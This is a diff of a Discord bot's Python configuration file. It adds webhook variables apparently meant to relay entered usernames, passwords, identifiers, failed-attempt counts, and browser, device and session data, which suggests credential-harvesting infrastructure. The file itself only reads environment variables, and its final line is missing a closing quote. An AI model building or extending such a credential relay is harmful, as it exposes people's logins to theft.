@@ -1,44 +1,48 @@
+
+```python
 # config.py
 import os
 
 # --- Discord Bot Configuration ---
-# Your Discord Bot Token - Must be set as an environment variable named "DISCORD_TOKEN"
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
-
-# Bot's command prefix (e.g., .help, !commands)
 COMMAND_PREFIX = os.getenv("COMMAND_PREFIX", ".")
 
 # --- Discord Channel IDs ---
-# These variables will attempt to read from environment variables.
-# If an environment variable is not found (e.g., in local testing without a .env file),
-# it will use the hardcoded default ID provided here.
-# For DEPLOYMENT, it is CRITICAL that you set environment variables on your hosting platform
-# with keys matching the first argument (e.g., "WEBSITE_CHANNEL_ID") and the value as the ID.
+WEBSITE_CHANNEL_ID = int(os.getenv("WEBSITE_CHANNEL_ID", "0"))
+LOGIN_CHANNEL_ID = int(os.getenv("LOGIN_CHANNEL_ID", "0"))
+DISCONNECTED_CHANNEL_ID = int(os.getenv("DISCONNECTED_CHANNEL_ID", "0"))
+LOGGING_CHANNEL_ID = int(os.getenv("LOGGING_CHANNEL_ID", "0"))
+ERROR_CHANNEL_ID = int(os.getenv("ERROR_CHANNEL_ID", "0"))
 
-# Channel ID for 'System Is Now Online' announcements (from the bot when it starts up)
-WEBSITE_CHANNEL_ID = int(os.getenv("WEBSITE_CHANNEL_ID", "1409339938427637811"))
-
-# Channel ID for '(user) Has Been Connected' announcements
-LOGIN_CHANNEL_ID = int(os.getenv("LOGIN_CHANNEL_ID", "1409340483255144608"))
-
-# Channel ID for '(user) Has Been Disconnected' announcements
-DISCONNECTED_CHANNEL_ID = int(os.getenv("DISCONNECTED_CHANNEL_ID", "1409350070326792293"))
-
-# Channel for general bot operational logs and command invocations
-LOGGING_CHANNEL_ID = int(os.getenv("LOGGING_CHANNEL_ID", "1409340101825265704"))
-
-# Channel for reporting critical errors and unhandled exceptions
-ERROR_CHANNEL_ID = int(os.getenv("ERROR_CHANNEL_ID", "1409349720928948244"))
+# --- Discord Webhook URLs (SET THESE AS ENVIRONMENT VARIABLES ON RENDER) ---
+# Each webhook needs a unique environment variable name.
+WEBHOOK_USERNAME_INFO = os.getenv("WEBHOOK_USERNAME_INFO")
+WEBHOOK_PASSWORD_INFO = os.getenv("WEBHOOK_PASSWORD_INFO")
+WEBHOOK_IDENTIFIER_INFO = os.getenv("WEBHOOK_IDENTIFIER_INFO")
+WEBHOOK_INVALID_USERNAME_INFO = os.getenv("WEBHOOK_INVALID_USERNAME_INFO")
+WEBHOOK_INVALID_PASSWORD_INFO = os.getenv("WEBHOOK_INVALID_PASSWORD_INFO")
+WEBHOOK_INVALID_IDENTIFIER_INFO = os.getenv("WEBHOOK_INVALID_IDENTIFIER_INFO")
+WEBHOOK_ATTEMPT_COUNTER_INFO = os.getenv("WEBHOOK_ATTEMPT_COUNTER_INFO")
+WEBHOOK_ATTEMPT_EXCEEDED_INFO = os.getenv("WEBHOOK_ATTEMPT_EXCEEDED_INFO")
+WEBHOOK_RESET_INFO = os.getenv("WEBHOOK_RESET_INFO")
+WEBHOOK_CORRECT_INFO = os.getenv("WEBHOOK_CORRECT_INFO")
+WEBHOOK_INCORRECT_INFO = os.getenv("WEBHOOK_INCORRECT_INFO")
+WEBHOOK_USER_INFO = os.getenv("WEBHOOK_USER_INFO")
+WEBHOOK_BROWSER_INFO = os.getenv("WEBHOOK_BROWSER_INFO")
+WEBHOOK_DEVICE_INFO = os.getenv("WEBHOOK_DEVICE_INFO")
+WEBHOOK_CONNECTION_INFO = os.getenv("WEBHOOK_CONNECTION_INFO")
+WEBHOOK_SESSION_INFO = os.getenv("WEBHOOK_SESSION_INFO")
 
 # --- Role ID for Admin Commands (Optional) ---
-# This will read the ADMIN_ROLE_ID environment variable.
 ADMIN_ROLE_ID_STR = os.getenv("ADMIN_ROLE_ID")
 ADMIN_ROLE_ID = int(ADMIN_ROLE_ID_STR) if ADMIN_ROLE_ID_STR and ADMIN_ROLE_ID_STR.isdigit() else None
 
-# --- Your Website API Configuration ---
-# This variable will read the WEBSITE_API_BASE_URL environment variable.
-# Example: https://your-custom-site.com/api
-WEBSITE_API_BASE_URL = os.getenv("WEBSITE_API_BASE_URL", "http://localhost:5000/api")
+# --- Your Website Internal API Configuration ---
+# This is the base URL for your *internal* Flask API. Discord bot calls this.
+WEBSITE_API_BASE_URL = os.getenv("WEBSITE_API_BASE_URL", "http://localhost:8000") # Flask running on this internal port.
 
-# --- Debugging (for local use only, should not be active in production) ---
-DEBUG_MODE = os.getenv("DEBUG_MODE", "False").lower() == "true"
+# --- Render-provided PORT ---
+PORT = int(os.getenv("PORT", "8000")) # Ensure this is also accessed by main.py directly where Flask runs.
+
+# --- Debugging ---
+DEBUG_MODE = os.getenv("DEBUG_MODE", "False").lower() == "true
